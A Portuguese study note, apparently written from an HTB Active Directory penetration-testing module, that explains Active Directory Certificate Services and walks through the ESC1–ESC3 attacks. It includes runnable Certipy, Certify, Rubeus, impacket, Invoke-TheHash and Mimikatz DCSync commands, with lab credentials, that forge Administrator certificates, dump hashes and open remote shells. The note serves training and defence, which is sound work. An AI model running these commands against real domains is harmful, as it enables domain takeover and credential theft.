---
layout: cyber
section: active-directory
title: "ADCS Attacks — Active Directory Certificate Services"
---

# ADCS Attacks — Active Directory Certificate Services

> Baseado em: HTB Active Directory Penetration Tester Path 2024, modulo 11 (ADCS Attacks)
> Pesquisa original: SpecterOps "Certified Pre-Owned" (Will Schroeder & Lee Christensen, 2021)

---

# O que é?

ADCS (Active Directory Certificate Services) é a implementação Microsoft de **PKI (Public Key Infrastructure)** totalmente integrada ao Active Directory. Introduzida no Windows Server 2000 e progressivamente melhorada, o ADCS fornece a infraestrutura de certificados digitais X.509 para toda a organização — desde autenticação de usuários via smartcard até criptografia de discos com BitLocker.

**O que são certificados X.509:**
Um certificado X.509 é um documento digital que associa uma **chave pública** a uma **identidade**, assinado por uma **Autoridade Certificadora (CA)** confiável. A estrutura básica:

```
Certificado X.509 (simplificado)
┌──────────────────────────────────────────────────────────┐
│  Subject: CN=John Smith, DC=corp, DC=com                 │
│  Issuer: CN=CORP-CA, DC=corp, DC=com                     │
│  Serial Number: 1A:2B:3C:4D:...                          │
│  Validity: 2025-01-01 to 2026-01-01                      │
│  Public Key: RSA 2048-bit → [chave pública]              │
├──────────────────────────────────────────────────────────┤
│  Extensions:                                             │
│    Subject Alternative Names (SANs):                     │
│      → UPN: jsmith@corp.com                              │
│      → DNS: jsmith-pc.corp.com                           │
│    Extended Key Usages (EKUs):                           │
│      → Client Authentication (1.3.6.1.5.5.7.3.2)        │
│      → Smart Card Logon (1.3.6.1.4.1.311.20.2.2)        │
├──────────────────────────────────────────────────────────┤
│  Signature (pela CA): [assinatura digital]               │
└──────────────────────────────────────────────────────────┘
```

**Componentes do ADCS:**

**Certification Authority (CA):**
```
Root CA (CA Raiz):
  → Geralmente "offline" (máquina isolada da rede, ligada apenas para operações críticas)
  → Assina o certificado das Subordinate CAs
  → Certificado auto-assinado (trust anchor)
  → Não emite certificados de usuários/computadores diretamente

Subordinate CA / Enterprise CA (CA Subordinada / Empresarial):
  → Online e integrada ao Active Directory
  → Publicada em CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com
  → Emite certificados baseados em Certificate Templates
  → Aceita autenticação Kerberos/NTLM de membros do domínio
  → Conhece todos os objetos AD (usuários, grupos, computadores)
  → ESTA é a CA relevante para ataques
```

**Certificate Templates:**
```
Certificate Templates são objetos LDAP em:
  CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com

Cada template define:
  → Nome e propósito (ex: "User", "Computer", "WebServer", "SmartcardLogon")
  → Enrollment Rights: quem pode solicitar certificados deste template
  → Extended Key Usages (EKUs): para que os certificados servem
  → Subject Name: quem fornece o nome (CA ou o solicitante?)
  → Manager Approval: requer aprovação manual antes de emitir?
  → Authorized Signatures Required: precisa de co-assinatura?
  → Validity Period: por quanto tempo o certificado é válido
  → Renewal Period: quando pode ser renovado
```

**EKUs (Extended Key Usages) — definem o propósito do certificado:**
```
OID: 1.3.6.1.5.5.7.3.2  → Client Authentication
  → Permite autenticação Kerberos via PKINIT (CRÍTICO para ataques)
  → Sem esse EKU, certificado não pode ser usado para login

OID: 1.3.6.1.4.1.311.20.2.2 → Smart Card Logon
  → Específico para autenticação via smartcard
  → Também permite autenticação Kerberos

OID: 1.3.6.1.5.2.3.4  → PKINIT Client Authentication
  → Variante do Client Authentication para PKINIT explícito

OID: 1.3.6.1.4.1.311.20.2.1 → Certificate Request Agent
  → Permite solicitar certificados EM NOME DE OUTROS usuários
  → Base do ataque ESC3

OID: 2.5.29.37.0  → Any Purpose
  → Certificado pode ser usado para qualquer finalidade
  → Extremamente permissivo e perigoso

(sem EKU):
  → Certificado de CA subordinada (SubCA)
  → Pode assinar outros certificados com qualquer EKU
```

**SANs (Subject Alternative Names):**
O campo SAN define identidades alternativas no certificado. No contexto do Active Directory, o SAN mais relevante é o **UPN (User Principal Name)** — o KDC mapeia o UPN do SAN para uma conta AD e emite TGT para essa conta. Se um atacante consegue colocar um UPN arbitrário no SAN, ele pode obter TGT de qualquer usuário.

**PKINIT — como certificados viram TGTs:**
```
PKINIT (RFC 4556) é uma extensão do Kerberos que substitui a
pré-autenticação baseada em senha por assinatura digital com certificado.

Fluxo normal (com senha):
  AS-REQ: usuário envia hash da senha como pré-autenticação
  AS-REP: KDC verifica hash, emite TGT

Fluxo PKINIT (com certificado):
  AS-REQ: usuário assina o request com sua chave privada
  KDC verifica: assinatura válida? CA emissora confiável (em NTAuthCertificates)?
                UPN/SAN do certificado corresponde a uma conta AD?
  AS-REP: KDC emite TGT para a conta identificada pelo UPN
  
  CONSEQUÊNCIA: o certificado substitui a senha completamente.
  Quem tem o certificado (e a chave privada) tem o TGT.
```

**NTAuthCertificates — o repositório de CAs confiáveis para autenticação:**
```
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com

Este objeto LDAP contém a lista de CAs cujos certificados são
aceitos pelo KDC para autenticação PKINIT.

Enterprise CAs são automaticamente adicionadas aqui durante instalação.
Se um atacante consegue adicionar uma CA maliciosa a este objeto,
pode emitir certificados que o KDC aceitará como autênticos.
```

# Onde é implementado?

ADCS está presente em praticamente toda organização corporativa com Windows Server. A Microsoft estimou que mais de 90% das organizações enterprise com Active Directory têm ADCS deployado. A infraestrutura raramente é auditada com o mesmo rigor que Kerberos ou NTLM, tornando vulnerabilidades muito mais prevalentes.

**Casos de uso legítimos que justificam o deployment:**

**1. Smart Card Authentication (Autenticação via Cartão Inteligente):**
```
[Usuário insere smartcard no leitor]
    ↓
[Certificado no chip do smartcard]
    ↓
[PKINIT: cliente assina AS-REQ com chave privada do chip]
    ↓
[KDC valida assinatura, emite TGT]
    ↓
[Usuário logado sem digitação de senha]

Onde: Ambientes governamentais, bancos, healthcare com regulação de identidade forte.
Requisito de ADCS: Enterprise CA emitindo certificados de Smart Card Logon
                   para todos os usuários com cartão
```

**2. Wireless 802.1X com autenticação de certificado:**
```
[Dispositivo corporativo tenta conectar ao Wi-Fi corporativo]
    ↓
[NPS (Network Policy Server) / RADIUS solicita certificado]
    ↓
[Dispositivo apresenta certificado emitido pela Enterprise CA corporativa]
    ↓
[NPS valida certificado → autoriza acesso à rede]

Onde: Qualquer empresa com Wi-Fi corporativo seguro.
Requisito de ADCS: Template de certificado de computador para enrollment automático
                   via Group Policy (Computer Certificate template)
```

**3. BitLocker com Network Unlock:**
```
[Servidor inicializa com BitLocker Network Unlock]
    ↓
[Servidor apresenta certificado ao WDS/PXE server]
    ↓
[WDS valida certificado, envia chave de proteção]
    ↓
[Disco descriptografado, servidor inicializa sem intervenção]

Onde: Data centers onde servidores não podem ter PINs manuais.
Requisito de ADCS: Template específico para BitLocker Network Unlock
```

**4. SSL/TLS para servidores web internos:**
```
[Aplicação interna usa HTTPS]
    ↓
[Enterprise CA emite certificado para o hostname interno]
    ↓
[Certificado confiado por todos os browsers que têm a CA raiz corporativa]
    ↓
[Conexão HTTPS estabelecida sem alertas de certificado]

Onde: Intranets, portais internos, APIs internas.
Requisito de ADCS: Template "Web Server" ou "Computer" para servidores
```

**5. S/MIME para email assinado/criptografado:**
```
[Usuário envia email com assinatura digital]
    ↓
[Cliente de email usa chave privada do certificado S/MIME para assinar]
    ↓
[Destinatário verifica assinatura com certificado público]
    ↓
[Garante autenticidade e não-repúdio do email]

Onde: Ambientes com requisito de non-repúdio (jurídico, financeiro).
```

**6. VPN com autenticação de certificado:**
```
[Cliente VPN apresenta certificado ao servidor VPN]
    ↓
[Servidor VPN valida certificado contra a CA corporativa]
    ↓
[Autenticação sem senha → menos vulnerável a phishing de senha]

Onde: Ambientes com políticas zero-trust para acesso remoto.
```

**Topologia típica de deployment enterprise:**
```
[Root CA — OFFLINE]
  → Máquina física isolada, ligada raramente
  → Certificado com 20 anos de validade
  → Assina certificados das Subordinate CAs
  → Guardada fisicamente num cofre
       |
       | (certificado da CA subordinada, renovado a cada 5-10 anos)
       v
[Subordinate CA / Enterprise CA — ONLINE]
  → Integrada ao AD
  → Publicada no CN=Public Key Services
  → Emite certificados para usuários e computadores
  → Geralmente em par (dois servidores para HA)
  → Endpoint HTTP: http://CA-SERVER/certsrv/
  → Endpoint RPC: porta 135 (Endpoint Mapper)
       |
       | (emite certificados baseados em templates)
       v
[Certificate Templates no AD]
  → User, Computer, DomainController, WebServer
  → SmartcardLogon, BitLockerNetworkUnlock
  → Templates customizados da organização
```

# Como funciona de forma adequada?

O ciclo de vida completo de um certificado em ADCS envolve solicitação, validação, emissão, uso e revogação. Cada etapa tem mecanismos técnicos específicos que, quando mal configurados, criam os vetores de ataque ESC1-ESC11.

**Fluxo completo de enrollment e uso via PKINIT:**

```
[FASE 1: DESCOBERTA]
Usuário/computador consulta AD para encontrar CAs disponíveis:
┌──────────┐  LDAP Query: CN=Enrollment Services    ┌──────────┐
│ Cliente  │ ────────────────────────────────────►  │   AD     │
│          │ ◄────────────────────────────────────  │          │
└──────────┘  Lista de Enterprise CAs e templates   └──────────┘

[FASE 2: GERAÇÃO DO CSR]
Cliente gera par de chaves RSA (ou ECC) localmente:
  → Chave privada: armazenada no key store local (CAPI/CNG)
                   NUNCA sai do dispositivo (em implementações corretas)
  → Chave pública: vai no CSR (Certificate Signing Request)

CSR contém:
  → Chave pública do cliente
  → Subject DN (nome do solicitante)
  → SANs desejados (se o template permite ENROLLEE_SUPPLIES_SUBJECT)
  → Assinatura do CSR com a chave privada (prova de posse)

[FASE 3: SUBMISSÃO PARA A CA]
┌──────────┐  CSR via RPC (porta 135/TCP) ou HTTP   ┌──────────┐
│ Cliente  │ ────────────────────────────────────►  │Enterprise│
│          │                                        │   CA     │
└──────────┘                                        └──────────┘

[FASE 4: VALIDAÇÃO PELA CA]
A CA executa uma série de verificações:
  ┌─ Verifica Enrollment Rights: solicitante tem permissão no template?
  ├─ Verifica Manager Approval: precisa de aprovação manual?
  ├─ Verifica Authorized Signatures: precisa de co-assinatura?
  ├─ Verifica EKUs: o template tem EKUs válidos para uso?
  └─ Verifica Subject Name: CA define o Subject? Ou o solicitante pode definir?

      Se o template tem ENROLLEE_SUPPLIES_SUBJECT:
        CA usa o Subject/SAN fornecido no CSR SEM VALIDAÇÃO se é o próprio solicitante
        → Esta é a vulnerabilidade ESC1

[FASE 5: EMISSÃO]
CA assina o certificado com sua chave privada e retorna ao cliente:
┌──────────┐                                        ┌──────────┐
│ Cliente  │ ◄────────────────────────────────────  │Enterprise│
│          │  Certificado X.509 assinado pela CA    │   CA     │
└──────────┘  (formato .cer, .pem, ou .pfx)         └──────────┘

[FASE 6: USO VIA PKINIT — autenticação sem senha]
┌──────────┐  AS-REQ com extensão PKINIT:           ┌──────────┐
│ Cliente  │  → AuthPack assinado com chave privada  │   KDC    │
│          │  → Certificado público incluído         │          │
└──────────┘                                        └──────────┘

KDC executa validação PKINIT:
  ┌─ Verifica assinatura do AuthPack com chave pública do certificado
  ├─ Verifica que a CA emissora está em NTAuthCertificates
  ├─ Verifica validade temporal do certificado
  ├─ Verifica que certificado não está revogado (CRL/OCSP)
  ├─ Extrai UPN do SAN do certificado
  └─ Mapeia UPN para conta AD

┌──────────┐                                        ┌──────────┐
│ Cliente  │ ◄────────────────────────────────────  │   KDC    │
│          │  TGT para a conta mapeada pelo UPN      │          │
└──────────┘  + Chave de sessão cifrada              └──────────┘

Resultado: cliente tem TGT sem nunca ter fornecido senha.
           Apenas a posse da chave privada + certificado é suficiente.
```

**EKUs relevantes em detalhe:**

```
Client Authentication (1.3.6.1.5.5.7.3.2):
  → O EKU mais crítico para ataques
  → Qualquer certificado com esse EKU pode ser usado em PKINIT
  → Presente em templates de usuário padrão (User, SmartcardUser)
  → Combinado com ENROLLEE_SUPPLIES_SUBJECT → ESC1

Smart Card Logon (1.3.6.1.4.1.311.20.2.2):
  → Equivalente ao Client Authentication para fins de PKINIT
  → Originalmente específico para smartcards físicos
  → KDC aceita esse EKU para autenticação Kerberos

Certificate Request Agent (1.3.6.1.4.1.311.20.2.1):
  → Permite que o portador solicite certificados EM NOME DE OUTROS
  → Mecanismo legítimo: agentes de enrollment para smartcard de usuários
  → Abuso: ESC3 — qualquer um com esse cert pode obter certs de qualquer usuário
```

**Ciclo de revogação — CRL e OCSP:**
```
Quando um certificado precisa ser revogado (chave comprometida, usuário demitido):

CRL (Certificate Revocation List):
  → Lista publicada pela CA em intervals regulares (ex: a cada 7 dias)
  → URL da CRL está no certificado (CDP — CRL Distribution Point)
  → Clientes/KDC fazem download e verificam se serial do cert está na lista
  → Problema: se CRL estiver offline ou vencida, verificação pode falhar (soft-fail)
              Em soft-fail: certificado revogado ainda pode ser aceito

OCSP (Online Certificate Status Protocol):
  → Consulta online em tempo real sobre status de um certificado específico
  → URL do OCSP está no certificado (AIA — Authority Information Access)
  → Mais rápido que CRL mas requer o OCSP Responder online
  → OCSP Stapling: servidor web inclui resposta OCSP no handshake TLS
```

**Enrollment automático via Group Policy:**
```powershell
# Configuração de auto-enrollment (Group Policy):
# Computer Configuration → Windows Settings → Security Settings →
#   Public Key Policies → Certificate Services Client - Auto-Enrollment

# Quando habilitado:
# → Computadores/usuários recebem automaticamente certificados dos templates
#   para os quais têm Enrollment Rights
# → Renovação automática quando validade se aproxima do vencimento
# → Administradores não precisam provisionar manualmente cada certificado

# Templates com auto-enrollment habilitado (enrollment flag CT_FLAG_AUTO_ENROLLMENT):
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=com" `
    -Filter {objectClass -eq "pKICertificateTemplate"} `
    -Properties mspki-enrollment-flag, mspki-certificate-name-flag, name |
    Where-Object { ($_.("mspki-enrollment-flag") -band 0x20) -ne 0 } |
    Select-Object Name
```

---

## Enterprise CA, Templates e PKI Integrada ao Active Directory

### Hierarquia PKI no Active Directory

```
Root CA (offline, geralmente Standalone CA)
  └── Subordinate / Enterprise CA (online, integrada ao AD)
        └── Emite certificados para usuarios, computadores, servicos
```

A **Enterprise CA** e o componente critico para ataques. Ela:
- Esta integrada ao Active Directory (publicada no container `CN=Public Key Services,CN=Services,CN=Configuration`)
- Conhece todos os objetos do dominio
- Emite certificados baseados em **Certificate Templates** armazenados no AD
- Aceita autenticacao via Kerberos dos membros do dominio

### Certificate Templates

Templates sao objetos LDAP no container `CN=Certificate Templates`. Eles definem:
- **Quem pode solicitar** (Enrollment Rights)
- **Para que serve o certificado** (Extended Key Usage / EKU)
- **Quem assina o Subject** (o solicitante ou a CA)
- **Se precisa aprovacao do gerente** (Manager Approval)
- **Se precisa assinatura autorizada** (Authorized Signatures Required)

### Extended Key Usages (EKUs) — Tabela de Referencia

| OID | Nome | Relevancia para Ataques |
|-----|------|------------------------|
| 1.3.6.1.5.5.7.3.2 | Client Authentication | Permite auth Kerberos (PKINIT) — **critico** |
| 1.3.6.1.5.2.3.4 | PKINIT Client Auth | Alternativa ao anterior |
| 1.3.6.1.4.1.311.20.2.2 | Smart Card Logon | Permite logon como smartcard |
| 2.5.29.37.0 | Any Purpose | Pode ser usado para qualquer coisa |
| 1.3.6.1.4.1.311.20.2.1 | Certificate Request Agent | Permite solicitar certs em nome de outros |
| (nenhum EKU) | SubCA | Pode assinar novos certificados |

### Processo de Enrollment (Solicitacao de Certificado)

```
Usuario/Computador
    |
    |--(1) Descobre CAs disponiveis via LDAP--> AD
    |
    |--(2) Cria Certificate Signing Request (CSR) com chave privada local
    |
    |--(3) Envia CSR para a CA via RPC/HTTP
    |
    |--(4) CA valida permissoes, template, aprovacao
    |
    |--(5) CA assina e retorna certificado (.cer/.pem)
    |
    |--(6) Usuario usa cert para autenticar (PKINIT -> TGT + NT Hash)
```

### Como Certificados Viram TGT (PKINIT)

O protocolo PKINIT (RFC 4556) permite que um certificado com EKU de Client Authentication substitua a senha no AS-REQ do Kerberos. O KDC valida a assinatura com a chave publica da CA confiavel. Se valido, emite um TGT para o SAN/UPN especificado no certificado.

**Consequencia:** se voce obtem um certificado com UPN `administrator@lab.local`, voce obtem um TGT de Administrator.

---

## Ferramentas

### Certify.exe (Windows)

Ferramenta C# da SpecterOps para enumeracao e abuso de ADCS a partir de Windows.

```powershell
# Enumerar todos os templates e CAs
.\Certify.exe find

# Enumerar apenas templates visivelmente vulneraveis
.\Certify.exe find /vulnerable

# Solicitar certificado com SAN alternativo (ESC1/ESC2)
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC1 /altname:administrator@lab.local

# Solicitar certificado do template ESC3 (enrollment agent)
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:ESC3

# Solicitar cert on-behalf-of usando enrollment agent cert (ESC3 passo 2)
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA /template:User /on-behalf-of:lab\administrator /enrollcert:agent.pfx /enrollcertpw:

# Listar CA e configuracoes
.\Certify.exe cas
```

**Saida importante de `find /vulnerable`:**
- `msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT` — solicitante define o Subject/SAN
- `pkiextendedkeyusage: Client Authentication` — pode autenticar
- `Authorized Signatures Required: 0` — sem assinatura adicional necessaria
- `Enrollment Rights: LAB\Domain Users` — qualquer usuario pode solicitar

### Certipy (Linux/Python)

Ferramenta Python de Oliver Lyak para ataques ADCS a partir de Linux.

```bash
# Instalar
pip install certipy-ad

# Enumerar templates vulneraveis (salva JSON + texto)
certipy find -u blwasp@lab.local -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable

# Enumerar e mostrar na tela
certipy find -u blwasp@lab.local -p 'Password123!' -dc-ip 10.129.205.199 -vulnerable -stdout

# Solicitar certificado (ESC1 — com UPN do admin)
certipy req -u blwasp@lab.local -p 'Password123!' -dc-ip 10.129.205.199 \
  -ca lab-LAB-DC-CA -template ESC1 -upn Administrator@lab.local

# Autenticar com certificado (obtem TGT + NT Hash)
certipy auth -pfx administrator.pfx -username administrator \
  -domain lab.local -dc-ip 10.129.205.199

# Shadow Credentials (alternativa a password reset)
certipy shadow auto -u blwasp@lab.local -p 'Password123!' -account user2

# Modificar UPN de usuario (ESC9)
certipy account update -u blwasp@lab.local -p 'Password123!' \
  -user user2 -upn user3@lab.local

# Solicitar cert on-behalf-of (ESC3)
certipy req -u blwasp@lab.local -p 'Password123!' -ca lab-LAB-DC-CA \
  -template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx

# Relay NTLM para HTTP da CA (ESC8)
certipy relay -target http://CA-SERVER/certsrv/certfnsh.asp -template DomainController
```

### Rubeus (Windows — autenticacao com certificado)

```powershell
# Autenticar com PFX e obter TGT + NT Hash
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap

# Criar sessao de logon sacrificial (para importar ticket sem afetar sessao atual)
.\Rubeus.exe createnetonly /program:powershell.exe /show

# Importar ticket base64 na sessao
.\Rubeus.exe ptt /ticket:doIGQjCCBj...

# Pass-the-Ticket direto com cert
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt
```

### Ferramentas Auxiliares

```powershell
# PowerShell — enumeracao LDAP de templates ESC1
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=lab,DC=local'

# PowerShell — enumeracao templates ESC2 (Any Purpose / sem EKU)
Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=lab,DC=local'

# Impacket — usar TGT para shell
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
KRB5CCNAME=administrator.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL

# Invoke-TheHash — Pass-the-Hash com NT Hash obtido
Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator \
  -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"

# Mimikatz — DCSync apos obter TGT de admin
Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'

# dacledit — verificar direitos sobre usuarios (para ESC9)
dacledit.py -action read -dc-ip 10.129.205.199 \
  lab.local/blwasp:Password123! -principal blwasp -target user2
```

---

## ESC1 — Template Permite SAN Definido pelo Solicitante

### Por Que Isso Importa

ESC1 e o ataque mais direto: um template vulneravel permite que o solicitante especifique qualquer Subject Alternative Name (SAN), incluindo o UPN de qualquer usuario do dominio. Como o KDC usa o SAN do certificado para mapear a identidade, voce pode se autenticar como qualquer pessoa — incluindo Domain Admins.

### Condicoes de Vulnerabilidade (todas necessarias)

1. A Enterprise CA concede direitos de enrollment a usuarios com baixo privilegio (ex: `Domain Users`)
2. Aprovacao de gerente esta desativada (`Manager Approval: False`)
3. Nenhuma assinatura autorizada e necessaria (`Authorized Signatures Required: 0`)
4. O template permite que o solicitante defina o Subject/SAN (`msPKI-Certificate-Name-Flag` contem `ENROLLEE_SUPPLIES_SUBJECT`)
5. O template especifica um EKU que habilita autenticacao de dominio (Client Authentication OID `1.3.6.1.5.5.7.3.2`, PKINIT, ou Smart Card Logon)

### Identificacao do Flag Critico

O flag `ENROLLEE_SUPPLIES_SUBJECT` corresponde ao valor `1` no atributo `mspki-certificate-name-flag`. Quando presente, o CSR pode incluir um SAN arbitrario que a CA aceita sem validacao.

### Na Pratica — Fluxo Completo

**Passo 1: Identificar templates vulneraveis (Linux)**

```bash
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable -stdout
```

Saida relevante que confirma ESC1:
```
Template Name          : ESC1
Client Authentication  : True
Enrollee Supplies Subject : True
Requires Manager Approval : False
Authorized Signatures Required : 0
Enrollment Rights      : LAB\Domain Users
[!] Vulnerabilities
    ESC1 : 'LAB.LOCAL\Domain Users' can enroll, ...
```

**Passo 2: Solicitar certificado como Administrator**

```bash
certipy req -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 \
  -ca lab-LAB-DC-CA \
  -template ESC1 \
  -upn Administrator@lab.local
```

Saida esperada:
```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Saved certificate and private key to 'administrator.pfx'
```

**Passo 3: Autenticar e obter TGT + NT Hash**

```bash
certipy auth -pfx administrator.pfx -username administrator \
  -domain lab.local -dc-ip 10.129.205.199
```

Saida esperada:
```
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Got hash for 'administrator@lab.local': aad3b435b51404eeaad3b435b51404ee:<NT_HASH>
```

**Passo 4: Usar o TGT para acesso**

```bash
# Via SMBExec
KRB5CCNAME=administrator.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL

# Via WMIExec
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

### ESC1 a partir de Windows

**Passo 1: Enumerar com Certify**

```powershell
C:\Tools> .\Certify.exe find /vulnerable
```

Confirmar: `msPKI-Certificate-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT`

**Passo 2: Solicitar certificado com SAN alternativo**

```powershell
C:\Tools> .\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA `
  /template:ESC1 /altname:administrator@lab.local
```

Isso gera `cert.pem` contendo chave privada + certificado.

**Passo 3: Converter para PFX (necessario para Rubeus)**

```powershell
# Salvar o bloco cert.pem e converter
C:\Tools> & "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 `
  -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" `
  -export -out cert.pfx
# Senha: pressionar Enter (sem senha)
```

**Passo 4: Autenticar com Rubeus**

```powershell
C:\Tools> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx `
  /getcredentials /nowrap
```

Saida relevante:
```
[+] TGT request successful!
[*] base64(ticket.kirbi): doIGQjCCBj...
    NTLM : 2b576acbe6bcfda7294d6bd18041b8fe
```

**Passo 5: Usar o ticket para lateral movement**

```powershell
# Criar sessao sacrificial
C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show

# No novo PowerShell, importar o ticket
C:\Tools> .\Rubeus.exe ptt /ticket:doIGQjCCBj<SNIP>

# Executar DCSync via Mimikatz no contexto do admin
C:\Tools> Invoke-Mimikatz -Command '"lsadump::dcsync /user:lab\Administrator"'
```

### Enumeracao LDAP Manual (PowerShell)

```powershell
# Busca direta no AD sem ferramentas externas
Get-ADObject -LDAPFilter '(&
  (objectclass=pkicertificatetemplate)
  (!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))
  (|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))
  (|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)
    (pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)
    (pkiextendedkeyusage=1.3.6.1.5.2.3.4))
  (mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1)
)' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```

---

## ESC2 — Template com EKU "Any Purpose" ou Sem EKU

### Por Que Isso Importa

ESC2 e uma variacao de ESC1. Quando um template define `Any Purpose EKU` (OID `2.5.29.37.0`) ou nao define nenhum EKU, o certificado pode ser usado para qualquer finalidade — incluindo autenticacao de cliente, code signing, server auth, etc. Um certificado sem EKU e essencialmente um certificado de CA subordinada que pode assinar outros certificados com EKUs arbitrarios.

### Condicoes de Vulnerabilidade

1. A Enterprise CA concede direitos de enrollment a usuarios com baixo privilegio
2. Aprovacao de gerente desativada
3. Nenhuma assinatura autorizada requerida
4. O template define `Any Purpose EKU` ou nao possui nenhum EKU

**Diferenca-chave em relacao a ESC1:** Mesmo que o solicitante NAO possa especificar o SAN, o certificado ainda e perigoso porque:
- Com SAN: exploravel identicamente ao ESC1
- Sem SAN: pode ser usado como enrollment agent para solicitar certs em nome de outros usuarios (similar a ESC3)
- Sem EKU (subordinate CA cert): pode ser usado para assinar certificados com qualquer EKU (limitado a nao ser confiado no `NTAuthCertificates` por padrao)

### Identificacao no Certipy

```bash
certipy find -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 -vulnerable -stdout
```

Saida que identifica ESC2:
```
Template Name          : ESC2
Any Purpose            : True
Enrollee Supplies Subject : True
Extended Key Usage     : Any Purpose
[!] Vulnerabilities
    ESC2 : 'LAB.LOCAL\Domain Users' can enroll ...
```

### Ataque — Linux (identico ao ESC1 quando SAN e permitido)

```bash
# Solicitar certificado com UPN do administrator
certipy req -u blwasp@lab.local -p 'Password123!' \
  -dc-ip 10.129.205.199 \
  -ca lab-LAB-DC-CA \
  -template ESC2 \
  -upn Administrator@lab.local

# Autenticar
certipy auth -pfx administrator.pfx -username administrator \
  -domain lab.local -dc-ip 10.129.205.199

# Usar TGT
KRB5CCNAME=administrator.ccache smbexec.py -k -no-pass LAB-DC.LAB.LOCAL
```

### Ataque — Windows (identico ao ESC1)

```powershell
# Solicitar
.\Certify.exe request /ca:LAB-DC.lab.local\lab-LAB-DC-CA `
  /template:ESC2 /altname:administrator@lab.local

# Converter e autenticar (mesmos passos do ESC1)
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

### Nota sobre NT Hash

Apos obter o NT Hash via Rubeus, e possivel usar Pass-the-Hash:

```powershell
# Importar Invoke-TheHash
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
cd .\Invoke-TheHash\; Import-Module .\Invoke-TheHash.psm1

# Executar comando remoto com NT Hash
Invoke-TheHash -Type SMBExec -Target localhost \
  -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe \
  -Command "net localgroup Administrators grace /add"
```

### Enumeracao LDAP Manual para ESC2

```powershell
Get-ADObject -LDAPFilter '(&
  (objectclass=pkicertificatetemplate)
  (!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))
  (|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))
  (|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))
)' -SearchBase 'CN=Configuration,DC=lab,DC=local'
```

---

## ESC3 — Abuso de Certificate Request Agent (Enrollment Agent)

### Por Que Isso Importa

ESC3 abusa do EKU `Certificate Request Agent` (OID `1.3.6.1.4.1.311.20.2.1`). Este EKU permite que um principal solicite certificados em nome de outros usuarios — e o mecanismo legitimo usado por smartcard enrollment agents. Um agente com este EKU pode co-assinar CSRs e obter certificados para qualquer usuario, incluindo admins.

**O ataque requer dois templates:**
- **Template 1:** Permite que usuarios com baixo privilegio obtenham um enrollment agent certificate (com o EKU Certificate Request Agent)
- **Template 2:** Permite que enrollment agents solicitem certificados em nome de outros usuarios, e tem um EKU de autenticacao de dominio

### Condicoes de Vulnerabilidade

**Condicao 1 (template do enrollment agent):**
1. Enterprise CA com enrollment rights para usuarios com baixo privilegio
2. Manager approval desativado
3. Sem assinaturas autorizadas requeridas
4. Template com permissoes excessivamente permissivas
5. Template inclui o EKU `Certificate Request Agent` (OID `1.3.6.1.4.1.311.20.2.1`)

**Condicao 2 (template alvo):**
1. Enterprise CA com enrollment rights para usuarios com baixo privilegio
2. Manager approval desativado
3. Template schema version 1 OU versao >= 2 com Application Policy Issuance Requirement exigindo o EKU Certificate Request Agent
4. Template define um EKU que habilita autenticacao de dominio
5. Sem restricoes de enrollment agents na CA

